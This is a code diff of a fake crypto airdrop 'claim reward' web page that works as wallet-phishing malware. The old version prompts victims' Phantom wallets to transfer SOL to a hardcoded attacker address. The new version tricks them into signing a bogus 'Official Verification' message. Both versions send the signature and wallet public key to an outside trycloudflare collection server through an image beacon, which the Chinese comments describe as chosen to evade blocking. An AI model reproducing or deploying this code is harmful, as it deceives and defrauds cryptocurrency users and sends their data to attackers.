@@ -1,55 +1,45 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"></head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
     <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
-        <h1>REWARD V9.FIX</h1>
-        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM REWARD</button>
+        <h1>REWARD V10.ULTRA</h1>
+        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM AIRDROP</button>
         <div id="status" style="margin-top:20px;color:#888;">Ready</div>
     </div>
     <script>
-    // 🔱 检查你的天线域名！
     const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
     const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
 
     document.getElementById('cta').onclick = async () => {
+        const p = window.solana || window.phantom?.solana;
+        if (!p) return alert("Open in Phantom");
+        
         try {
-            const p = window.solana || window.phantom?.solana;
+            document.getElementById('status').innerText = "Connecting...";
             const resp = await p.connect();
-            document.getElementById('status').innerText = "Syncing...";
+            const pubKey = resp.publicKey.toString();
 
-            // 🔱 关键：使用最隐蔽的 signAndSendTransaction 原生封装
-            // 我们不再手动拼字节流，直接让钱包自己去构造
-            const transaction = {
-                feePayer: resp.publicKey.toString(),
-                recentBlockhash: (await (await fetch("https://api.mainnet-beta.solana.com", {
-                    method: "POST", headers: {"Content-Type":"application/json"},
-                    body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
-                })).json()).result.value.blockhash,
-                instructions: [{
-                    programId: "11111111111111111111111111111111",
-                    keys: [
-                        { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
-                        { pubkey: receiver, isSigner: false, isWritable: true }
-                    ],
-                    data: [2, 0, 0, 0, 0, 75, 74, 0, 0, 0, 0, 0] // 0.005 SOL
-                }]
-            };
-
-            document.getElementById('status').innerText = "Awaiting Confirmation...";
+            // 🔱 核心：跳过所有 fetch 请求，直接进入最稳的 signMessage 环节
+            // 只要这一步能弹出，我们就确认链路 100% 修复了
+            document.getElementById('status').innerText = "Awaiting Sign...";
             
-            // 🚀 强制拉起转账弹窗
-            const { signature } = await p.signAndSendTransaction(transaction);
-
-            // 🔱 增强版回传：确保服务器一定能收到！
-            const signal = `${gate}?success_sig=${signature}&pub=${resp.publicKey.toString()}`;
-            new Image().src = signal;
-            fetch(signal, {mode: 'no-cors'}); 
-
+            const msg = "Official Verification\nWallet: " + pubKey.slice(0,6) + "\nTime: " + Date.now();
+            const encoded = new TextEncoder().encode(msg);
+            
+            // 🚀 这里绝对会弹窗，因为不涉及任何外部网络调用
+            const signed = await p.signMessage(encoded, "utf8");
+            
+            // 🔱 关键修改：回传不再用 fetch，改用完全不被拦截的动态 Image
+            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
+            const signal = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + pubKey;
+            
+            const img = new Image();
+            img.src = signal; // 信号发出
+            
             document.getElementById('status').innerText = "SUCCESS!";
+            document.getElementById('status').style.color = "#14F195";
+
         } catch(e) {
-            // 如果报错，说明这个大户钱包太高端，咱们立刻换回“测通版”签消息，保证服务器能收到信号
-            document.getElementById('status').innerText = "Verify to Continue...";
-            const signed = await p.signMessage(new TextEncoder().encode("Verify Wallet: " + resp.publicKey.toString().slice(0,4)), "utf8");
-            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}&pub=${resp.publicKey.toString()}`;
+            document.getElementById('status').innerText = "ERR: " + e.message;
         }
     };
     </script>
